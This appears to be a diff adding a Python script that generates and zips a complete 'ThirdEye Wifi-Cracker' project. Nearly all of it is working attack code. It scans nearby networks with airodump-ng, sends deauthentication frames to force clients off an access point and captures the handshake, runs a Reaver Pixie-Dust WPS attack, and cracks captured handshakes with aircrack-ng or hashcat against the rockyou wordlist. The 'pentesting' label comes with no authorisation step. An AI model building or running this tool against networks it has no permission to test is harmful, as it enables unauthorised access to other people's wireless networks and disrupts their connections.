@@ -1,0 +1,131 @@
+import os
+import zipfile
+
+# 1. Define all file contents
+files = {
+    "utils.py": """
+import os, subprocess
+from colorama import Fore, Style
+
+def check_root():
+    if os.getuid() != 0:
+        print(Fore.RED + "[!] Error: Run with sudo/root privileges!")
+        exit()
+
+def toggle_monitor(interface, mode="start"):
+    print(Fore.YELLOW + f"[*] Switching {interface} to {mode}...")
+    subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True)
+    subprocess.run(["sudo", "airmon-ng", mode, interface], capture_output=True)
+
+def create_folders():
+    if not os.path.exists("captures"):
+        os.makedirs("captures")
+""",
+    "scanner.py": """
+import pandas as pd
+import subprocess, os, time
+from tabulate import tabulate
+from colorama import Fore
+
+def wifi_scan(interface):
+    print(Fore.CYAN + "[*] Scanning for 15s...")
+    os.system("rm -f scan-01.csv")
+    proc = subprocess.Popen(["sudo", "airodump-ng", "--write", "scan", "--output-format", "csv", interface], 
+                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    try:
+        time.sleep(15)
+    except KeyboardInterrupt:
+        pass
+    proc.terminate()
+    if os.path.exists("scan-01.csv"):
+        df = pd.read_csv("scan-01.csv", skipinitialspace=True).dropna(subset=['BSSID'])
+        print(tabulate(df[['BSSID', 'channel', 'pwr', 'essid']], headers='keys', tablefmt='psql'))
+        return df
+    return None
+""",
+    "attacks.py": """
+import os, subprocess, time, signal
+from colorama import Fore
+
+class ThirdEyeAttacks:
+    def __init__(self, interface):
+        self.interface = interface
+
+    def handshake_capture(self, bssid, channel, essid):
+        out = f"captures/{essid.replace(' ', '_')}"
+        sniff = subprocess.Popen(["sudo", "airodump-ng", "-c", channel, "--bssid", bssid, "-w", out, self.interface])
+        print(Fore.RED + "[!] Sending Deauth...")
+        subprocess.run(["sudo", "aireplay-ng", "--deauth", "20", "-a", bssid, self.interface])
+        time.sleep(10)
+        os.kill(sniff.pid, signal.SIGTERM)
+        print(Fore.GREEN + f"[+] Captured saved to {out}")
+
+    def wps_pixie(self, bssid):
+        subprocess.run(["sudo", "reaver", "-i", self.interface, "-b", bssid, "-K", "1", "-vv"])
+""",
+    "cracker.py": """
+import subprocess, os
+from colorama import Fore
+
+class ThirdEyeCracker:
+    def crack_wpa_standard(self, cap_file, wordlist="/usr/share/wordlists/rockyou.txt"):
+        print(Fore.CYAN + "[*] Launching CPU Cracker...")
+        subprocess.run(["sudo", "aircrack-ng", "-w", wordlist, cap_file])
+
+    def crack_with_hashcat(self, cap_file, wordlist="/usr/share/wordlists/rockyou.txt"):
+        hash_file = cap_file.replace(".cap", ".hc22000")
+        print(Fore.MAGENTA + "[*] Converting for Hashcat...")
+        subprocess.run(["hcxpcapngtool", "-o", hash_file, cap_file])
+        if os.path.exists(hash_file):
+            subprocess.run(["hashcat", "-m", "22000", hash_file, wordlist, "--force"])
+""",
+    "main.py": """
+from utils import check_root, toggle_monitor, create_folders
+from scanner import wifi_scan
+from attacks import ThirdEyeAttacks
+from cracker import ThirdEyeCracker
+from colorama import Fore, init
+
+init(autoreset=True)
+
+def main():
+    check_root(); create_folders()
+    print(Fore.CYAN + "=== THIRDEYE WIFI-CRACKER v1.0 ===")
+    iface = input("Enter Interface: ")
+    toggle_monitor(iface, "start")
+    mon_iface = iface + "mon" if "mon" not in iface else iface
+    
+    atk = ThirdEyeAttacks(mon_iface)
+    crk = ThirdEyeCracker()
+
+    while True:
+        print("\\n1. Scan\\n2. Handshake\\n3. Crack\\n4. Exit")
+        c = input("Choice: ")
+        if c == '1': wifi_scan(mon_iface)
+        elif c == '2': atk.handshake_capture(input("BSSID: "), input("CH: "), input("ESSID: "))
+        elif c == '3': crk.crack_wpa_standard(input("CAP Path: "))
+        elif c == '4': toggle_monitor(mon_iface, "stop"); break
+
+if __name__ == "__main__":
+    main()
+""",
+    "setup.sh": """
+#!/bin/bash
+sudo apt update
+sudo apt install -y aircrack-ng reaver pixiewps hashcat hcxtools python3-pandas python3-tabulate python3-colorama
+chmod +x main.py
+echo "[+] Installation Finished."
+""",
+    "README.md": "# ThirdEye Wifi-Cracker\nAI-Managed WiFi Pentesting Tool."
+}
+
+# 2. Create files and Zip them
+zip_name = "ThirdEye_Final_Project.zip"
+with zipfile.ZipFile(zip_name, 'w') as zipf:
+    for filename, content in files.items():
+        with open(filename, "w") as f:
+            f.write(content.strip())
+        zipf.write(filename)
+        print(f"[+] Created {filename}")
+
+print(f"\\n{'#'*30}\\n[SUCCESS] {zip_name} is ready!\\n{'#'*30}")
